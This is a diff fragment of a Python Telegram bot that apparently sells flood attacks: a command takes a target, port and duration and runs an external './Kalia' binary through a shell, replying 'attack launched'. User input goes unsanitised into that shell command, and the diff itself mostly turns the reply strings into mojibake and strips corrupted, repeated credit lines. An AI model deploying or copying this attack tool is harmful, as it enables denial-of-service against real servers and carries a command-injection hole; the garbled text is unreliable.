@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"𝐇𝐄𝐘{username}, \n✨✨ 🚨𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘.\n\n📡 𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🔌 𝐏𝐎𝐑𝐓: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑 𝐎𝐅 @SIDIKI_MUSTAFA_47 "
+    response = f"ð‡ð„ð˜{username}, \nâœ¨âœ¨ ðŸš¨ð€ð“ð“ð€ð‚ðŠ ð‹ð€ð”ðð‚ð‡ð„ðƒ ð’ð”ð‚ð‚ð„ð’ð’ð…ð”ð‹ð‹ð˜.\n\nðŸ“¡ ð“ð€ð‘ð†ð„ð“: {target}\nðŸ”Œ ððŽð‘ð“: {port}\nâ±ï¸ ð“ð¢ð¦ðž: {time} ð’ðžðœð¨ð§ðð¬\n\nðŒðžð­ð¡ð¨ð: ðð‘ð„ðŒðˆð”ðŒ ð”ð’ð„ð‘ ðŽð… @SIDIKI_MUSTAFA_47 "
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /mustafa command
@@ -246,7 +246,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./Kalia {target} {port} {time} 877"
                 subprocess.run(full_command, shell=True)
-                response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘💀. \n📡 𝐓𝐀𝐑𝐆𝐄𝐓: {target} \n🔌 𝐏𝐎𝐑𝐓: {port} \n⏱️ 𝐓𝐈𝐌𝐄: {time} \n 𝐉𝐎𝐈𝐍 - https://t.me/SIDIKILEAKS "
+                response = f"ð€ð“ð“ð€ð‚ðŠ ð‹ð€ð”ðð‚ð‡ð„ðƒ ð’ð”ð‚ð‚ð„ð’ð’ð…ð”ð‹ð‹ð˜ðŸ’€. \nðŸ“¡ ð“ð€ð‘ð†ð„ð“: {target} \nðŸ”Œ ððŽð‘ð“: {port} \nâ±ï¸ ð“ðˆðŒð„: {time} \n ð‰ðŽðˆð - https://t.me/SIDIKILEAKS "
         else:
             response = "Usage :- /mustafa <target> <port> <time>"  # Updated command syntax
     else:
@@ -385,11 +385,3 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-
-#By RᴀɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ʀs�ʀsʀsᴋᴇʀs�ʀs�ʀsʀs�ʀsʀs�ᴇʀs�ʀs�ʀsʀse:
-        print(e)
-
-#By RᴀɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ʀs�ʀsʀsᴀᴄᴋᴇʀs�ɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ʀs�ʀsʀs
-        print(e)
-
-#By RᴀɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ɢɴᴀʀᴏK Cʀᴀᴄᴋᴇʀs�ʀs�ʀsʀs�ᴄᴋᴇʀs�ʀs�ʀsʀs��ᴄᴋᴇʀs�ʀs�ʀsʀs�ᴇʀs�ʀs�ʀsʀs
